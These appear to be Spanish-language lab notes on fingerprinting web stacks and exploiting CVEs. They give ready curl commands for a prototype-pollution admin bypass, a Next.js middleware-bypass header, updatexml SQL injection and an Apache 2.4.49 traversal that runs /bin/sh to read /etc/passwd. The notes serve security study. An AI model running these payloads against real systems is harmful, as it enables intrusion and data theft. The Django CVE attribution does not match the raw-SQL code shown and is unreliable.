# Fingerprinting de Stacks Web y CVEs Reales (MERN, Next.js, Django, LAMP)

Relacionado: [[HTTP-Peticiones-y-Respuestas]] · [[Content-Discovery-Manual-OSINT-y-Gobuster]] · [[Vulnerability-Scanning-y-CVE]] · [[Bases-de-Datos-SQL]] · [[Herramientas-SQLMap]] · [[Reconocimiento-Manual-Web-y-DevTools]] · [[OWASP-Top-10-2025]]

## La idea central
Cada stack web "filtra" su identidad en headers, nombres de cookie, mensajes de error y patrones del HTML — antes de mandar un solo payload de explotación, identificar el stack exacto (y su versión) dice directamente qué CVEs aplican. Un scanner genérico se pierde bypasses de autenticación que viven en una sola función de middleware, o RCEs que dependen de entender un protocolo de deserialización específico — el fingerprinting manual seguido de investigación de CVE dirigida es como trabajan los red teamers con experiencia.

**Flujo de 3 pasos, igual para cada stack:**
1. Fingerprint del stack a partir de señales HTTP pasivas (sin payloads de explotación todavía).
2. Confirmar la versión e identificar el CVE aplicable.
3. Ejecutar la cadena de explotación y entender la causa raíz.

## 1. MERN (MongoDB, Express, React, Node.js)
Deployment típico en Ubuntu: Node.js (NodeSource PPA), Express en puerto 3000/5000, MongoDB en 27017. En producción normalmente hay un reverse proxy (Nginx) al frente — pero en entornos mal configurados o herramientas internas, Express suele quedar expuesto directo.

### Fingerprint
```bash
curl -I 10.65.141.202:3000/
curl http://10.65.141.202:3000/nonexistent
```
| Señal | Valor | Confianza |
|---|---|---|
| Header `X-Powered-By` | `Express` | Alta |
| Cookie | `connect.sid=s%3A...` | Alta |
| Ruta inexistente | `Cannot GET /nonexistent` (texto plano) | Alta |
| Elemento raíz del frontend | presente en el `<body>` | Media |

`X-Powered-By: Express` lo manda Express en cada respuesta por default — solo desaparece si el dev lo desactiva a propósito (`app.disable('x-powered-by')`) o usa middleware como Helmet; casi nadie se molesta en quitarlo, aunque un reverse proxy (Nginx, Cloudflare, Vercel) sí puede eliminarlo antes de que llegue al cliente. La cookie `connect.sid` viene de `express-session` — con `saveUninitialized: false` (recomendado para sesiones de login) la cookie solo aparece **después** de crear una sesión, así que su ausencia no descarta Express. El mensaje `Cannot GET /ruta` en texto plano ante una ruta inexistente es distintivo: Django muestra una página HTML de error, Apache un 403/404 con estilo, Next.js una página HTML con error estilizado — solo Express responde así de "seco".

### Vulnerabilidad: Prototype Pollution → bypass de autorización
Endpoints de la app: `POST /api/user/update` (mezcla el JSON recibido dentro del objeto de sesión del usuario, sin filtrar claves) y `GET /api/admin/flag` (revisa `currentUser.isAdmin`).

```bash
curl -c cookies.txt http://10.65.141.202:3000/
curl -b cookies.txt http://10.65.141.202:3000/api/admin/flag
# {"error":"Not authorized"}  ← confirma que el chequeo funciona para sesiones normales
```
`-c cookies.txt` guarda las cookies que manda el servidor (incluida `connect.sid`) en un archivo local · `-b cookies.txt` las reenvía en peticiones posteriores para mantener la misma sesión.

**La causa raíz:** todo objeto de JavaScript hereda de `Object.prototype`. Una función `merge()` que copia recursivamente claves de un JSON recibido, sin filtrar `__proto__`, termina escribiendo directo sobre `Object.prototype` en vez de sobre el objeto de sesión — y **cualquier objeto del proceso Node.js** que consulte `.isAdmin` va a encontrar `true` a través de la cadena de prototipos, aunque nunca se haya puesto esa propiedad ahí directamente.

```bash
curl -b cookies.txt -X POST http://10.65.141.202:3000/api/user/update \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"isAdmin": true}}'
# {"status":"updated"}

curl -b cookies.txt http://10.65.141.202:3000/api/admin/flag
# {"flag":"..."}
```
El payload `{"__proto__": {"isAdmin": true}}` hace que `merge()`, al recorrer las claves, encuentre `__proto__`, vea que es un objeto y recurse — pero `target["__proto__"]` no es una clave normal, es una **referencia directa** a `Object.prototype`, así que ahí queda `isAdmin: true` puesto de forma global. Cuando algunas apps filtran `__proto__` a nivel de input, la ruta `{"constructor": {"prototype": {"isAdmin": true}}}` llega a `Object.prototype` por otro camino y puede saltarse ese filtro.

## 2. Next.js (App Router / React Server Components)
En Ubuntu corre como proceso Node.js bajo un usuario dedicado (`node`/`www-data`), típicamente con `npm start` después de `npm run build`. El App Router (default desde Next.js 14) habilita React Server Components — la base de los CVEs de esta sección.

> ⚠️ Los CVEs de esta sección solo aplican en modo producción (`npm run build && npm start`) — nunca en modo desarrollo (`next dev`). Confirmar el modo antes de asumir que aplica.

### Fingerprint
```bash
curl -I http://10.65.141.202:3001/
```
| Señal | Valor | Confianza |
|---|---|---|
| Header `X-Powered-By` | `Next.js` | Alta |
| HTML fuente | `window.__next_f` dentro de un `<script>` | Alta — confirma App Router específicamente |
| Rutas de assets estáticos | `/_next/static/chunks/` | Alta |
| Headers de middleware | `x-middleware-next` / `x-middleware-rewrite` | Media |
| Redirección a ruta protegida | HTTP 307 a `/login` | Media |

`window.__next_f` es el indicador definitivo de App Router: es el array de hidratación para los datos de React Server Components, inyectado por Next.js en el HTML de cada página que usa App Router — no aparece en Pages Router ni en ningún otro framework.

### CVE-2025-29927 — Bypass de middleware (CVSS 9.1 Crítico)
El middleware de Next.js corre antes de cada request y suele ser el único gate de autenticación/sesión de la app. Next.js usa un header interno, `x-middleware-subrequest`, para evitar loops infinitos cuando el middleware se reenvía una petición a sí mismo — pero **nunca valida si ese header viene de un proceso interno legítimo o de un cliente externo**.

```bash
curl -v http://10.65.141.202:3001/dashboard
# → redirige a /login (confirma que el middleware SÍ protege la ruta)

curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://10.65.141.202:3001/dashboard
# → devuelve el contenido protegido, saltándose el middleware por completo
```
El valor del header codifica la ruta del módulo de middleware, **repetida 5 veces** — para un `middleware.ts` en la raíz del proyecto es exactamente `middleware` × 5 separado por `:`. Si el proyecto usa estructura `/src`, el valor cambia a `src/middleware` × 5 (probar esa variante si la primera no funciona). Al incluir este header, Next.js trata la petición como si ya hubiera pasado por el middleware y la manda directo al handler de la página — cero credenciales, cero fuerza bruta, un solo header que el framework mismo confiaba sin validar.

> Mención aparte: **CVE-2025-55182** (CVSS 10.0) es una RCE no autenticada por deserialización insegura en el parser del protocolo RSC Flight — afecta Next.js 14.3.0-canary.77+ y 15.x <15.2.3 con React 19. Requiere su propia sala dedicada para el exploit completo; aquí solo queda mapeado como parte del fingerprint (headers `x-nextjs-cache`, `x-nextjs-prerender`, `x-nextjs-stale-time`).

## 3. Django
En Ubuntu corre bajo Gunicorn o el servidor de desarrollo integrado, típicamente en el puerto 8000. El panel `/admin/` y el middleware CSRF vienen activados por default en prácticamente todo proyecto Django.

### Fingerprint
```bash
curl -I "http://10.82.95.115:8000/products/"
```
| Señal | Valor | Confianza |
|---|---|---|
| Header `Server` | `WSGIServer/0.2 CPython/X.X.X` | Alta |
| Cookie | `csrftoken` | Alta |
| `X-Frame-Options` | `DENY` | Alta |
| `X-Content-Type-Options` | `nosniff` | Alta |
| `Referrer-Policy` | `same-origin` | Media |
| HTML fuente (cualquier form POST) | campo oculto `csrfmiddlewaretoken` | Alta — el más confiable |

El campo `csrfmiddlewaretoken` es el fingerprint más confiable de Django: `CsrfViewMiddleware` lo inyecta automáticamente en cada formulario POST — no aparece en Express, Rails ni Next.js. La combinación `X-Frame-Options: DENY` + `X-Content-Type-Options: nosniff` + `Referrer-Policy: same-origin` juntos delata el `SecurityMiddleware` de Django (ningún otro framework aplica exactamente esa combinación por default).

### CVE-2021-35042 — SQL Injection en `order_by()` (CVSS 9.8 Crítico, sin autenticación)
La vista de `/products/` concatena el parámetro `order` directo dentro de una cláusula `ORDER BY`, sin sanitizar:
```python
sql = f'SELECT id, name, price, description FROM products_product ORDER BY (CASE WHEN (1=1) THEN {order} ELSE name END)'
```
Como `1=1` siempre es verdadero, la rama `THEN` (donde va el input del usuario sin filtrar) siempre se ejecuta — ese es el punto de inyección.

La técnica usa `updatexml()`, una función de MySQL que lanza un error si la expresión XPath es inválida. Metiendo un `SELECT` dentro de esa expresión con `concat(0x7e, ...)`, MySQL incluye el resultado de la subconsulta directo en el mensaje de error — `0x7e` es el hexadecimal de `~`, usado como delimitador para ubicar el dato extraído dentro de todo el ruido del mensaje. **Esto solo funciona si `DEBUG = True`** en `settings.py` (Django muestra los errores de MySQL en el body de la respuesta 500); con `DEBUG = False` en producción, la alternativa es inyección ciega basada en tiempo con `SLEEP()`.

```bash
curl -s "http://10.65.141.202:8000/products/?order=updatexml(1,concat(0x7e,(select%20@@version)),1)" \
  | grep -o '~[0-9][^&]*'
# ~8.0.45-0ubuntu0.22.04.1

curl -s "http://10.65.141.202:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)" \
  | grep -o '~[0-9a-zA-Z_][^&]*'
# ~vuln_db
```
`select @@version` / `select database()` son las subconsultas que se van rotando dentro del mismo patrón de inyección para ir extrayendo distintos datos uno por uno (versión de MySQL, nombre de la BD, y después se puede seguir con `information_schema.tables` para dumpear tablas/columnas, o pasarle el punto de inyección confirmado a `sqlmap` — ver [[Herramientas-SQLMap]] — para automatizar el resto). `grep -o '~[0-9a-zA-Z_][^&]*'` aísla el valor extraído del resto del HTML/error usando el delimitador `~` como ancla.

## 4. LAMP — Apache + mod_cgi
Stack clásico: Linux + Apache (`www-data`, sirviendo desde `/var/www/html`) + MySQL + PHP (`mod_php`/PHP-FPM). Aún muy presente en sistemas legacy.

### Fingerprint
```bash
curl -I http://10.65.141.202:8080/
curl -v http://10.65.141.202:8080/nonexistent
curl -v http://10.65.141.202:8080/cgi-bin/
```
| Señal | Valor | Confianza |
|---|---|---|
| Header `Server` | `Apache/2.4.49 (Unix)` | Alta — mapea a un CVE exacto |
| Pie de página del 404 | repite la versión de Apache | Alta |
| Respuesta de `/cgi-bin/` | `403 Forbidden` (no 404) | Alta — confirma `mod_cgi` habilitado |

`Server: Apache/2.4.49 (Unix)` es suficiente por sí solo: esa versión exacta mapea a **CVE-2021-41773 y nada más**. Un `403` en `/cgi-bin/` (en vez de `404`) confirma que el directorio existe y `mod_cgi` está activo — condición necesaria para este exploit específico.

### CVE-2021-41773 — Path traversal + RCE vía mod_cgi (CVSS 9.8 Crítico)
Apache 2.4.49 introdujo un cambio en `ap_normalize_path()` que rompió el filtro de path traversal por un problema de **orden de decodificación**: el filtro que bloquea `../` corre **antes** de que la URL se decodifique completamente. Mandando `.%2e/` (un punto literal + un punto codificado en URL + slash), el filtro no lo reconoce como `../` — pero cuando Apache pasa la ruta ya decodificada al sistema de archivos, el propio OS sí la resuelve como `../`. El filtro queda saltado.

Por sí solo esto es lectura arbitraria de archivos (traversal). Lo que lo vuelve crítico es la combinación con `mod_cgi`: si el traversal llega hasta un binario ejecutable como `/bin/sh`, Apache lo ejecuta como si fuera un script CGI y pasa el body del POST directo a su `stdin`.

```bash
curl -s --path-as-is "http://10.65.141.202:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data 'echo Content-Type: text/plain; echo; id'
# uid=1(daemon) gid=1(daemon) groups=1(daemon)
```
`--path-as-is` es obligatorio: por default curl **normaliza** la URL antes de mandarla, "limpiando" las secuencias `.%2e/` y enviando una ruta ya sin traversal — el síntoma típico de olvidarlo es recibir `403` en vez de ejecución. Esta bandera le dice a curl "manda la URL exactamente como la escribí, sin tocarla". Los cuatro segmentos `.%2e/` suben cuatro niveles desde `/cgi-bin/` hasta la raíz y de ahí entran a `/bin/sh`. El `echo Content-Type: text/plain; echo;` al inicio del body es obligatorio por la especificación CGI — Apache espera un bloque de cabeceras HTTP válido seguido de una línea en blanco antes del contenido real; sin eso responde `500` en vez de ejecutar el comando.

```bash
curl -s --path-as-is "http://10.65.141.202:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data 'echo Content-Type: text/plain; echo; cat /etc/passwd'
```
Con RCE confirmada, se puede leer cualquier archivo alcanzable por el usuario que corre Apache (`daemon` en este caso — confirma que el servidor no corre como root).

> CVE-2021-41773 es específica de versión: solo Apache **2.4.49** tiene el bug completo. La versión 2.4.50 parchó parcialmente (solo bloqueó la codificación simple, dejando abierta la variante de doble-encoding rastreada como **CVE-2021-42013**, con `%%32%65%%32%65/`). 2.4.51+ ya está totalmente parchado.

## 5. Nikto — primer pase automatizado
Para un scope con muchos hosts, Nikto da un primer vistazo rápido: prueba cada servicio, lee headers de respuesta, y saca a la luz señales de stack y misconfiguraciones conocidas sin escribir un solo payload manual.
```bash
nikto -h http://10.65.141.202:3000   # MERN
nikto -h http://10.65.141.202:3001   # Next.js
nikto -h http://10.65.141.202:8000   # Django
nikto -h http://10.65.141.202:8080   # Apache
```
En los cuatro casos, Nikto confirmó el stack en menos de un minuto — para Apache incluso dio el número de versión exacto, sin necesidad de fingerprinting manual adicional. Para MERN y Django confirmó el stack, pero **Nikto no tiene templates para fallas de inyección a nivel de aplicación** (prototype pollution, SQLi en `order_by()`) — ahí es donde retoman las técnicas manuales de esta nota.

## Resumen de CVEs de esta sala
| Stack | CVE | Impacto | CVSS |
|---|---|---|---|
| MERN / Express | (prototype pollution en función `merge` propia) | Bypass de autorización vía `Object.prototype` | — |
| Next.js Middleware | CVE-2025-29927 | Un solo header → bypass completo de middleware | 9.1 Crítico |
| Django ORM | CVE-2021-35042 | SQL injection vía `ORDER BY` sin parametrizar | 9.8 Crítico |
| Apache + mod_cgi | CVE-2021-41773 | Path traversal + RCE | 9.8 Crítico |

## Lección central de la sala
Cada stack filtra su identidad — una vez que se sabe leer esas señales, se deja de adivinar y se empieza a apuntar directo. El enfoque siempre debería ser entender **por qué** existe una vulnerabilidad antes de lanzar el exploit: cada header revisado y cada versión confirmada acerca a un ataque dirigido y basado en evidencia, en vez de un escaneo ruidoso.
